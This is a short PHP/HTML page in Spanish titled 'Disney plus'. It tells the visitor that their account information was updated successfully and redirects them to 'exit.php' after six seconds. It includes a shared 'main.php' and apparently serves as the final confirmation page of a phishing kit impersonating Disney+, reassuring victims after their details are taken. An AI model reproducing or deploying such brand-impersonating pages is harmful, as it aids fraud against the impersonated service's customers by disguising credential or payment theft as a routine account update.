<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disney plus</title>
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
    <div class="left">
        <img src="res/logo.png">
    </div>
    <div class="right">
        <div class="legend">Información actualizada exitosamente</div>
    </div>
</header>

<main>
<div class="form" style="width:1000px; margin:0; text-align:center;">

<div class="container w-100 m-0 p-4 text-center">
    <img src="res/done.png" style="width:40px;">
</div>
<div class="container m-0 p-4 text-center d-inline-block" style="width:500px;">
    <p>Su información ha sido actualizada exitosamente. Todos los cambios han sido guardados y ya se reflejan en la configuración de su cuenta.</p>
    <p>Será redirigido a su cuenta en breve.</p>
</div>
 


</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
    setTimeout(() => {
        window.location="exit.php";
    }, 6000);
</script>
</body>
</html>